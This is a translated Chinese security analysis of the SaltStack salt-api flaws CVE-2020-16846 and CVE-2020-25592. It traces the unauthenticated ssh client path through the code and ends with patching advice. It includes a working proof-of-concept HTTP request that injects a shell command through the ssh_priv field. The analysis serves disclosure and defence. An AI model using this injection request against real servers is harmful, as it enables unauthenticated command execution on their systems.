# SaltStack 未授权访问及命令执行漏洞分析（CVE-2020-16846/CVE-2020-25592）

## 译文声明
本文为翻译文章，译文仅供参考。具体内容和含义请以原文为准。

## 一、背景

### 漏洞概述
SaltStack 是一个分布式运维系统，在互联网场景中被广泛应用，具有以下两个主要功能：
- **配置管理系统**：能够将远程节点维护在一个预定义的状态（例如，确保安装特定的软件包并运行特定的服务）。
- **分布式远程执行系统**：用于在远程节点上单独或通过任意选择标准来执行命令和查询数据。

2020年11月4日，SaltStack 官方发布了一则安全更新公告，指出 CVE-2020-16846 和 CVE-2020-25592 组合使用可在未授权的情况下通过 `salt-api` 接口执行任意命令。具体来说，CVE-2020-25592 允许任意用户调用 SSH 模块，而 CVE-2020-16846 则允许用户执行任意命令。尽管 `salt-api` 不是默认开启的配置，但绝大多数 SaltStack 用户会选择开启此功能，因此存在较高的风险。

### 漏洞编号
- CVE-2020-16846
- CVE-2020-25592

### 受影响版本
- 3002
- 3001.1, 3001.2
- 3000.3, 3000.4
- 2019.2.5, 2019.2.6
- 2018.3.5
- 2017.7.4, 2017.7.8
- 2016.11.3, 2016.11.6, 2016.11.10
- 2016.3.4, 2016.3.6, 2016.3.8
- 2015.8.10, 2015.8.13

## 二、漏洞分析及 POC

### 漏洞分析
截至2020年11月11日，补丁代码尚未与 GitHub 中的 master 分支代码合并，因此可以直接从 SaltStack 官方 GitHub 仓库获取。目前 master 的代码版本为 3002，系统为 Mac。版本号相差较大时，代码变动较大，需要另行分析。

```plaintext
Salt Version:
              Salt: 3002-56-g3e269eda82
Dependency Versions:
              cffi: 1.14.3
          cherrypy: unknown
          dateutil: Not Installed
         docker-py: Not Installed
             gitdb: 4.0.5
         gitpython: 3.1.11
            Jinja2: 2.11.2
           libgit2: Not Installed
          M2Crypto: Not Installed
              Mako: 1.0.7
           msgpack: 1.0.0
      msgpack-pure: Not Installed
      mysql-python: Not Installed
         pycparser: 2.19
          pycrypto: Not Installed
      pycryptodome: 3.9.9
            pygit2: Not Installed
            Python: 3.8.2 (default, Sep 24 2020, 19:37:08)
      python-gnupg: Not Installed
            PyYAML: 5.3.1
             PyZMQ: 19.0.2
             smmap: 3.0.4
           timelib: Not Installed
           Tornado: 4.5.3
               ZMQ: 4.3.2
System Versions:
              dist: darwin 19.6.0 
            locale: utf-8
           machine: x86_64
           release: 19.6.0
            system: Darwin
           version: 10.15.6 x86_64
```

`salt-api` REST 接口默认使用 CherryPy 框架。从 `run` 接口的实现可以看出，通过 `client` 参数动态调用 `NetapiClient` 类中的方法。文中指定代码位置采用以下约定：`FileLocation:Classname.method()`。

- `salt/netapi/init.py:NetapiClient.run()`
  - `low` 参数为外部传入参数，`salt.utils.args.format_call` 方法将参数赋值给 `**kwargs`。
  - 当 `client` 参数为 `ssh` 时，动态调用 `salt/netapi/init.py:NetapiClient.ssh()`，该方法未采用任何鉴权。

- `salt/netapi/init.py:NetapiClient.ssh()`
  - 跟进路径如下：
    - `salt/netapi/init.py:NetapiClient.ssh() ⇒ salt/client/ssh/client.py:SSHClient.cmd_sync() ⇒ salt/client/ssh/client.py:SSHClient._prep_ssh()`
  - `salt/client/ssh/client.py:SSHClient._prep_ssh()`
    - 该方法将 `kwargs` 外部可控参数更新到 `opts` 变量，该变量可以理解为 SaltStack 系统的环境变量，并使用该变量初始化 `salt.client.ssh.SSH`。
  - `salt/client/ssh/init.py:SSH.__init__()`
    - `priv` 的值从 `opts` 变量中获取，并调用 `salt.client.ssh.shell.gen_key()` 方法。
  - `salt/client/ssh/shell.py:gen_key()`
    - 该方法中对命令进行拼接并执行。当传入值为 `|COMMAND>{} #` 时，即可执行 `COMMAND` 命令。

### POC
根据上述分析，POC 如下：

```http
POST /run HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/x-yaml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|open%20/System/Applications/Calculator.app%3b
```

### 关于复现环境
1. 在 Mac 上复现需要手动创建日志文件夹、配置文件夹等，并需要手动写入相关配置。
2. Docker 从官方环境拉取的镜像中默认没有 SSH，因此执行该 POC 时 `salt-api` 会挂掉。经测试，3002 版本会自动重启，而 3000.4 版本和 2019.2.5 版本则不会。因此，当 `salt-api` 挂掉时，优先考虑当前机器上是否有 SSH 软件。

## 三、安全建议
1. 尽快修复。由于官方并未放出升级包，目前仍需要手动进行修复。这里是 [官方安全通告](https://docs.saltproject.io/en/latest/topics/releases/2020.11.0.html) 和 [修复补丁](https://github.com/saltstack/salt/pull/56714)。
2. 如果不需要使用 `salt-api`，请关闭该功能。